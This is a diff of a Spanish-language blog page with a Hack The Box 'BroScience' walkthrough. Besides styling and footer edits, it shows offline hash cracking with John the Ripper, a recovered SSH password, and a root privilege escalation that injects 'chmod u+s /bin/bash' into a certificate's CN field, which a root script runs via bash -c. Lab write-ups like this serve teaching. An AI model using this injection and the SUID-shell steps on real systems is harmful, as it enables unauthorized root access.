+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>usuario:$dynamic_4$hash_en_md5$salt
 </span></span></code></pre></div><p>El archivo final queda de la siguiente manera:</p>
 <img src="/images/Pasted image 20260604212334.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>A continuación, ejecutamos <code>John the Ripper</code> utilizando el formato adecuado:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --format<span style="color:#ff7b72;font-weight:bold">=</span>dynamic_4 --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt hashes.txt
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --format<span style="color:#ff7b72;font-weight:bold">=</span>dynamic_4 --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt hashes.txt
 </span></span></code></pre></div><p>Obteniendo las contraseñas de tres usuarios:</p>
 <img src="/images/Pasted image 20260604212412.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Al enumerar los usuarios existentes en el sistema observamos que existe la cuenta <code>bill</code>.</p>
 <img src="/images/Pasted image 20260604212455.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Probamos las credenciales recuperadas mediante <code>SSH</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>bill : iluvhorsesandgym
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh bill@broscience.htb
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>bill : iluvhorsesandgym
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh bill@broscience.htb
 </span></span></code></pre></div><p>La autenticación es exitosa y obtenemos acceso al sistema como el usuario <code>bill</code>.</p>
 <img src="/images/Pasted image 20260604212621.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Con acceso a la cuenta de <code>bill</code>, ya es posible recuperar la flag de usuario:</p>
@@ -379,9 +393,9 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
 <p>Tras observar el sistema durante algunos minutos, identificamos un proceso que se ejecuta periódicamente:</p>
 <img src="/images/Pasted image 20260605150409.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>El comando ejecutado es el siguiente:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
 </span></span></code></pre></div><p>Analizando el contenido de <code>renew_cert.sh</code>, encontramos el siguiente código:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!/bin/bash                                                                                                          
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!/bin/bash                                                                                                          
 </span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$#</span><span style="color:#a5d6ff">&#34;</span> -ne <span style="color:#a5d6ff">1</span> <span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">||</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#79c0ff">$1</span> <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#34;-h&#34;</span> <span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">||</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#79c0ff">$1</span> <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#34;--help&#34;</span> <span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">||</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#79c0ff">$1</span> <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#34;help&#34;</span> <span style="color:#ff7b72;font-weight:bold">]</span>; <span style="color:#ff7b72">then</span>                                                    
 </span></span><span style="display:flex;"><span>    echo <span style="color:#a5d6ff">&#34;Usage: </span><span style="color:#79c0ff">$0</span><span style="color:#a5d6ff"> certificate.crt&#34;</span>;                     
 </span></span><span style="display:flex;"><span>    exit 0;                 
@@ -440,10 +454,10 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
 </span></span></code></pre></div><p>El script valida inicialmente que se haya proporcionado un único argumento correspondiente a un certificado. Posteriormente, comprueba que el archivo exista y verifica si expirará durante las próximas 24 horas.</p>
 <p>Si el certificado continúa siendo válido por más de 24 horas, el script finaliza sin realizar ninguna acción.</p>
 <p>Cuando el certificado está próximo a expirar, se extrae su campo <em>Subject</em>, que contiene información similar a la siguiente:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">subject</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">C</span> <span style="color:#ff7b72;font-weight:bold">=</span> US, <span style="color:#79c0ff">ST</span> <span style="color:#ff7b72;font-weight:bold">=</span> Texas, <span style="color:#79c0ff">L</span> <span style="color:#ff7b72;font-weight:bold">=</span> Austin, <span style="color:#79c0ff">O</span> <span style="color:#ff7b72;font-weight:bold">=</span> BroScience, <span style="color:#79c0ff">OU</span> <span style="color:#ff7b72;font-weight:bold">=</span> IT, <span style="color:#79c0ff">CN</span> <span style="color:#ff7b72;font-weight:bold">=</span> broscience.htb
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">subject</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">C</span> <span style="color:#ff7b72;font-weight:bold">=</span> US, <span style="color:#79c0ff">ST</span> <span style="color:#ff7b72;font-weight:bold">=</span> Texas, <span style="color:#79c0ff">L</span> <span style="color:#ff7b72;font-weight:bold">=</span> Austin, <span style="color:#79c0ff">O</span> <span style="color:#ff7b72;font-weight:bold">=</span> BroScience, <span style="color:#79c0ff">OU</span> <span style="color:#ff7b72;font-weight:bold">=</span> IT, <span style="color:#79c0ff">CN</span> <span style="color:#ff7b72;font-weight:bold">=</span> broscience.htb
 </span></span></code></pre></div><p>A continuación, el script obtiene cada uno de los campos (<code>C</code>, <code>ST</code>, <code>L</code>, <code>O</code>, <code>OU</code> y <code>CN</code>) y los reutiliza para generar un nuevo certificado autofirmado. Finalmente, dicho certificado es almacenado temporalmente en <code>/tmp/temp.crt</code> y movido al directorio <code>/home/bill/Certs</code>.</p>
 <p>La línea vulnerable es la siguiente:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/bash -c <span style="color:#a5d6ff">&#34;mv /tmp/temp.crt /home/bill/Certs/</span><span style="color:#79c0ff">$commonName</span><span style="color:#a5d6ff">.crt&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/bash -c <span style="color:#a5d6ff">&#34;mv /tmp/temp.crt /home/bill/Certs/</span><span style="color:#79c0ff">$commonName</span><span style="color:#a5d6ff">.crt&#34;</span>
 </span></span></code></pre></div><p>El valor de <code>$commonName</code> proviene directamente del certificado proporcionado por el usuario. Debido a que este valor es interpolado dentro de un comando ejecutado mediante <code>bash -c</code>, sin ningún mecanismo de sanitización o escapado, es posible inyectar comandos arbitrarios a través del campo <code>CN</code>.</p>
 <p>Dado que el script es ejecutado por <code>root</code>, cualquier comando inyectado se ejecutará con privilegios elevados, permitiendo una escalada de privilegios.</p>
 <h2 id="generando-un-certificado-malicioso">
@@ -454,18 +468,18 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
   </a>
 </h2>
 <p>El certificado procesado periódicamente por el script corresponde a:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/home/bill/Certs/broscience.crt
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/home/bill/Certs/broscience.crt
 </span></span></code></pre></div><img src="/images/Pasted image 20260605152843.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Como el usuario <code>bill</code> posee permisos de escritura sobre dicho directorio, podemos reemplazar el certificado legítimo por uno controlado por nosotros:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl req -x509 -sha256 -nodes -days <span style="color:#a5d6ff">1</span> -newkey rsa:4096 -keyout /dev/null -out broscience.crt
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl req -x509 -sha256 -nodes -days <span style="color:#a5d6ff">1</span> -newkey rsa:4096 -keyout /dev/null -out broscience.crt
 </span></span></code></pre></div><p>El campo relevante para la explotación es <code>Common Name (CN)</code>. Por tanto, introducimos nuestra carga útil en dicho campo. En este caso utilizaremos:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod u+s /bin/bash
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod u+s /bin/bash
 </span></span></code></pre></div><img src="/images/Pasted image 20260605153202.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Una vez reemplazado el certificado, únicamente debemos esperar a que la tarea programada ejecutada por <code>root</code> procese el archivo.</p>
 <p>Después de unos instantes, verificamos que el bit SUID ha sido establecido correctamente:</p>
 <img src="/images/Pasted image 20260605153252.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Finalmente, obtenemos una shell con privilegios de <code>root</code> ejecutando:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -p
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -p
 </span></span></code></pre></div><p>Con ello obtenemos acceso completo al sistema y podemos recuperar la flag <code>root.txt</code>.</p>
 <img src="/images/Pasted image 20260605153339.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h1 id="conclusión">
@@ -503,13 +517,13 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
   <section class="container">
     ©
     
-      2019 -
+      2025 -
     
     2026
      CeleroRKX 
     ·
     
-    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    Desarrollado por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
     
   </section>
 </footer>
@@ -523,6 +537,11 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
   <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
   
 
+  
+  
+  
+  <script src="/js/gestures.min.6cbd91590032e7f15addfe0af40403b55908afeef98fe1be098e196656366619.js" integrity="sha256-bL2RWQAy5/Fa3f4K9AQDtVkIr&#43;75j&#43;G&#43;CY4ZZlY2Zhk="></script>
+  
   
 
   
